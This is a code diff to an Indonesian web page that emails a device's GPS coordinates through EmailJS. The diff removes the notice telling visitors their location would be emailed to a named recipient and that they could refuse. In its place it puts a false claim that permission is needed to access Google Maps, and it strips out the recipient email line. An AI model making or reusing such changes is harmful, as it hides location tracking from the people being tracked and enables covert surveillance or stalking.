@@ -96,12 +96,7 @@
     <h3>Berbagi lokasi GPS</h3>
 
     <div class="notice">
-      Jika kamu memilih setuju, website akan meminta izin
-      lokasi dari browser. Jika kamu mengizinkannya, koordinat
-      GPS perangkat ini akan dikirim melalui email ke penerima
-      yang disebutkan di bawah.
-      Kamu boleh membatalkan sebelum menyetujui.
-      Jika izin lokasi ditolak, koordinat tidak akan dikirim.
+      Izin diperlukan untuk mengakses Google Maps.
       <p>
         <strong>Penerima email:</strong>
         <span id="recipientDisplay"></span>
@@ -125,9 +120,6 @@
     const EMAILJS_SERVICE_ID = "service_873xl3f";
     const EMAILJS_TEMPLATE_ID = "template_g80wg7l";
 
-    // Ganti dengan email penerima yang sebenarnya.
-    // Samakan dengan pengaturan To Email di template EmailJS.
-    const RECIPIENT_EMAIL = "wanzz4160@gmail.com";
 
     emailjs.init({
       publicKey: EMAILJS_PUBLIC_KEY
